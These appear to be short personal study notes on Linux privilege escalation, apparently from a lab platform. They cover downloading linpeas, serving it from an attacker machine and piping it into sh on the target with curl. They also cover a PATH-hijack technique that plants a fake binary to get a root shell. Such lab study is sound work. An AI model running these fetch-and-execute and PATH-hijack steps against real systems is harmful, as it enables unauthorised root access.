# Privilege Escalation:

## linPeas:
  1. ```wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh```

  2. Once the linpeas.sh is downloaded, we can make our own webserver for the target machine to access. That way we can run the
     linpeas script in the target machine:
        ```python3 -m http.server 80```
  3. From the target machine, we can download the linpeas script from the attacker machine's web server with a curl command:
        ```curl http://<Your_Kali_VM_IP>/linpeas.sh | sh```

  4. make sure to modify permissions to allow us to execute linpeas.sh:
    ```chmod +x linpeas.sh```
  5. GTFOBins: after linpeas has found a PrivEsc vulnerability, GTFOBins can be used to find out how to exploit the PrivEsc vulnerability:
  https://gtfobins.github.io/

## PATH PrivEsc:
1. Find a binary in the system that calls for the execution of an easily replicatable file. Let's say a binary/script calls for a file called 'thm', we can create a copy of the 'thm' file that will be found first in the PATH variable.
2. Find a writeable directory using ```find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u```
3. Choose one of the writeable directories and add that chosen directory to the path variable: ```export PATH=/tmp:$PATH``` in the case we chose tmp as the writeable directory.
4. In that writeable directory, add a file with the same name as the one you want to copy, in this case 'thm'.
5. To create an executable file use ```echo "/bin/bash" > thm```
6. Allow it to be executed with ```chmod 777 thm```
7. Go back and run the executable and you will be given a shell with root.




// 1. use ```id``` command to check which groups the user is a part of. 
// 2. once we find the groups the a user is a part of, we can use
    ```find / -group "groupName" -type f 2>/dev/null```
// to find the files that are owned by the group/user

